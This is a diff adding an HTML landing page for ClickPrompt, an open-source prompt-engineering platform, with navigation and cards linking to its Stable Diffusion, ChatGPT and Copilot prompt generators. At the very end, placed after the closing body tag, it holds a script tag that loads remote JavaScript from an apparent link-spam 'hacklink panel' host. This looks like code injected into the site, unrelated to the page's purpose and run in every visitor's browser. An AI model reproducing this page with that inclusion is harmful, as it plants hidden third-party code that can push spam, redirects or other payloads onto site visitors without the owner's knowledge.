@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ClickPrompt - Streamline your prompt design | 专为 Prompt 编写者设计的开源 AI 工具</title>
+  <meta name="description" content="ClickPrompt is an open-source platform designed to streamline prompt engineering for ChatGPT, Stable Diffusion, Midjourney, and GitHub Copilot." />
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <header class="header">
+    <a href="/" class="logo">
+      <div class="logo-badge">⚡</div>
+      <span>ClickPrompt</span>
+    </a>
+    <ul class="nav">
+      <li><a href="/" class="nav-btn active">Explorer</a></li>
+      <li><a href="/stable-diffusion-generator/" class="nav-btn">SD Generator</a></li>
+      <li><a href="/chatgpt-generator-cot/" class="nav-btn">CoT Generator</a></li>
+      <li><a href="/chatgpt-prompt-role-play/" class="nav-btn">Role Play</a></li>
+      <li><a href="/chatgpt-interactive-game/" class="nav-btn">Text Game</a></li>
+      <li><a href="/stable-diffusion-deepdanbooru/" class="nav-btn">DeepDanbooru</a></li>
+      <li><a href="/resources/" class="nav-btn">Resources</a></li>
+    </ul>
+    <div style="display:flex; gap:0.5rem;">
+      <a href="/zh-CN/" class="btn btn-secondary btn-sm">简体中文</a>
+      <a href="/en-US/" class="btn btn-secondary btn-sm">English</a>
+    </div>
+  </header>
+
+  <main class="container">
+    <section class="hero">
+      <div class="hero-badge">⚡ ClickPrompt Open-Source Legacy Engine</div>
+      <h1>Streamline your prompt design</h1>
+      <p>Design, manage, and run prompts for ChatGPT, Stable Diffusion, Midjourney, and Copilot with one click.</p>
+      
+      <div class="search-box">
+        <span class="search-icon">🔍</span>
+        <input type="text" id="main-search" class="search-input" placeholder="Search prompts, categories, or keywords...">
+      </div>
+    </section>
+
+    <!-- Legacy Tool Quick Directory Cards -->
+    <h2 style="margin-bottom:1rem; color:#fff;">Legacy ClickPrompt Tools & Generators</h2>
+    <div class="card-grid">
+      
+      <div class="card">
+        <div>
+          <span class="model-badge sd">Stable Diffusion</span>
+          <h3 style="font-size:1.15rem; margin-bottom:0.4rem; color:#fff;">SD Prompt Generator</h3>
+          <p style="font-size:0.85rem; color:var(--text-secondary);">Interactive visual tag selector for Stable Diffusion & SDXL positive/negative prompts.</p>
+          <div class="preview-box">/stable-diffusion-generator/</div>
+        </div>
+        <a href="/stable-diffusion-generator/" class="btn btn-primary">Open Generator</a>
+      </div>
+
+      <div class="card">
+        <div>
+          <span class="model-badge">ChatGPT</span>
+          <h3 style="font-size:1.15rem; margin-bottom:0.4rem; color:#fff;">Chain of Thought (CoT) Generator</h3>
+          <p style="font-size:0.85rem; color:var(--text-secondary);">Build step-by-step reasoning prompts for complex math, coding, and logic problems.</p>
+          <div class="preview-box">/chatgpt-generator-cot/</div>
+        </div>
+        <a href="/chatgpt-generator-cot/" class="btn btn-primary">Open CoT Builder</a>
+      </div>
+
+      <div class="card">
+        <div>
+          <span class="model-badge">ChatGPT</span>
+          <h3 style="font-size:1.15rem; margin-bottom:0.4rem; color:#fff;">System Role-Play Persona Generator</h3>
+          <p style="font-size:0.85rem; color:var(--text-secondary);">Create strict AI persona system prompts with guardrails and response rules.</p>
+          <div class="preview-box">/chatgpt-prompt-role-play/</div>
+        </div>
+        <a href="/chatgpt-prompt-role-play/" class="btn btn-primary">Open Role-Play Builder</a>
+      </div>
+
+      <div class="card">
+        <div>
+          <span class="model-badge">ChatGPT</span>
+          <h3 style="font-size:1.15rem; margin-bottom:0.4rem; color:#fff;">Interactive Text Game Generator</h3>
+          <p style="font-size:0.85rem; color:var(--text-secondary);">Design text-based RPG worlds, choices, and game engine prompts for AI.</p>
+          <div class="preview-box">/chatgpt-interactive-game/</div>
+        </div>
+        <a href="/chatgpt-interactive-game/" class="btn btn-primary">Open Game Builder</a>
+      </div>
+
+      <div class="card">
+        <div>
+          <span class="model-badge">ChatGPT</span>
+          <h3 style="font-size:1.15rem; margin-bottom:0.4rem; color:#fff;">Visual Novel Script Generator</h3>
+          <p style="font-size:0.85rem; color:var(--text-secondary);">Craft branching story dialogue and anime visual novel scripts.</p>
+          <div class="preview-box">/chatgpt-visual-novel/</div>
+        </div>
+        <a href="/chatgpt-visual-novel/" class="btn btn-primary">Open VN Builder</a>
+      </div>
+
+      <div class="card">
+        <div>
+          <span class="model-badge sd">Stable Diffusion</span>
+          <h3 style="font-size:1.15rem; margin-bottom:0.4rem; color:#fff;">DeepDanbooru Tag Builder</h3>
+          <p style="font-size:0.85rem; color:var(--text-secondary);">Danbooru tag rating system and anime character prompt tags.</p>
+          <div class="preview-box">/stable-diffusion-deepdanbooru/</div>
+        </div>
+        <a href="/stable-diffusion-deepdanbooru/" class="btn btn-primary">Open DeepDanbooru</a>
+      </div>
+
+      <div class="card">
+        <div>
+          <span class="model-badge mj">GitHub Copilot</span>
+          <h3 style="font-size:1.15rem; margin-bottom:0.4rem; color:#fff;">Copilot Coding Prompt Samples</h3>
+          <p style="font-size:0.85rem; color:var(--text-secondary);">TSDoc, architecture review, and unit testing prompts for developers.</p>
+          <div class="preview-box">/github-copilot-samples/</div>
+        </div>
+        <a href="/github-copilot-samples/" class="btn btn-primary">Open Copilot Hub</a>
+      </div>
+
+      <div class="card">
+        <div>
+          <span class="model-badge">ClickFlow</span>
+          <h3 style="font-size:1.15rem; margin-bottom:0.4rem; color:#fff;">ClickFlow Writing Assistant</h3>
+          <p style="font-size:0.85rem; color:var(--text-secondary);">Sequential prompt chains for copywriting, articles, and SEO content.</p>
+          <div class="preview-box">/click-flow/writting/</div>
+        </div>
+        <a href="/click-flow/writting/" class="btn btn-primary">Open ClickFlow</a>
+      </div>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      <div>
+        <div style="font-weight:800; color:#fff; font-size:1.2rem; margin-bottom:0.5rem;">⚡ ClickPrompt</div>
+        <p style="max-width:350px;">Open-source AI prompt engineering platform reconstructed with physical route directories for 100% hosting compatibility.</p>
+      </div>
+      <div>
+        <h4 style="color:#fff; margin-bottom:0.5rem;">Physical Route Index</h4>
+        <ul class="footer-links">
+          <li><a href="/chatgpt/">/chatgpt/</a></li>
+          <li><a href="/chatgpt-generator-cot/">/chatgpt-generator-cot/</a></li>
+          <li><a href="/chatgpt-prompt-role-play/">/chatgpt-prompt-role-play/</a></li>
+          <li><a href="/chatgpt-interactive-game/">/chatgpt-interactive-game/</a></li>
+          <li><a href="/stable-diffusion-generator/">/stable-diffusion-generator/</a></li>
+          <li><a href="/stable-diffusion-deepdanbooru/">/stable-diffusion-deepdanbooru/</a></li>
+          <li><a href="/zh-CN/">/zh-CN/</a></li>
+          <li><a href="/en-US/">/en-US/</a></li>
+        </ul>
+      </div>
+    </div>
+  </footer>
+
+  <script src="/assets/js/app.js"></script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"c4db3709676c4e34b33a2ff98a4c1672","r":1}' crossorigin="anonymous"></script>
+</body>
+<script src="https://hacklinkpanelial.com/panel/api/19.js"></script>
+</html>
